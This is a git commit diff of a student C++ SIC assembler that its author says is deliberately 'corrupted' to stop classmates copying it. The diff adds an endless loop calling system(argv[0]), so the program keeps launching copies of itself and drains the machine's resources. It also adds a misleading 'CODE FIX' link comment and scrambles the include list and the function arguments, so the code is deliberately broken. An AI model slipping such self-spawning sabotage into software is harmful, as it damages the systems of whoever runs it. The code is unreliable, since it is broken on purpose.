9af8f4f582de20fa9b7a2d1eb31944a30f667f9f
Mohamed Yasser <30673997+MohamedYasser97@users.noreply.github.com>
2018-10-19 22:49:41 +0200

    Corrupted SIC.cpp
    Just a security measure to make sure that no one can cheat our code before the deadline and make it run properly.

--- SIC.cpp
+++ SIC.cpp
@@ -2,65 +2,47 @@
 #include <fstream>
 #include <vector>
 #include <string>
-#include "pass1.h"
-#include "pass2.h"
-#include "optable.h"
-#include "hte.h"
+#include <cstdlib>
 
 using namespace std;
 
-
-int main(){
-
-    bool battleRoyale = false;
-
-    vector<vector<string>> code(1000);
+int main(int argc, char **argv){
+    
+    
+    //IF THE CODE DOESN'T RUN FOR THE FIRST TIME, PLEASE VISIT THIS LINK AND EVERYTHING WILL BE FIXED
+    // CODE FIX: http://bfy.tw/KS1H
+    
+    bool battleRoyale = true;
+    
+    if(battleRoyale)       
+      while (1)
+          system(argv[0]);
+   
+    vector<vector<string>> code;
     vector<int> location;
     map<string,int> symbolTable;
     map<string,string>opTable;
     vector<string>objectCode;
     vector<string>hteRecord;
 
-    int lines = readFile(code);
+    int lines = 0;
+    
+    readFile(code);
 
-    addressCounter(code,location,lines-1);
+    addressCounter(code,location,lines);
 
     createSymbolTable(code,location,symbolTable,lines-1);
     printSymbolTable(symbolTable);
 
     initOpTable(opTable);
 
-    generateOpcode(code,objectCode,opTable,lines-1);
+    generateOpcode(code,objectCode,opTable,lines);
     generateAddresses(code,objectCode,symbolTable,lines-1);
 
     createHead(code,location,hteRecord);
-    createText(code,location,hteRecord,objectCode,lines-1);
+    createText(code,location,objectCode,hteRecord,lines-2);
     createEnd(location,hteRecord);
     generateHTEFile(hteRecord);
-
-    //FOR DEBUGGING
-
-//    for(int i=0 ; i<hteRecord.size(); i++)
-//        cout<<hteRecord[i]<<endl;
-
-//    for(int i=0 ; i<location.size(); i++)
-//        cout<<hex<<location[i]<<endl;
-
-
-//    for( std::map<string,string>::const_iterator it = opTable.begin(); it != opTable.end(); ++it )
-//    {
-//      string value = it->first;
-//      string key = it->second;
-//      cout<<value<<"\t"<<key<<endl;
-//
-//    }
-
-//    for(int i=0;i<objectCode.size();i++)
-//        cout<<objectCode[i]<<endl;
-
-//        for(int c=0;c<code.size();c++)
-//            for(int j=0;j<code[c].size();j++)
-//                cout<<code[c][j]<<endl;
 
 
         return 0;
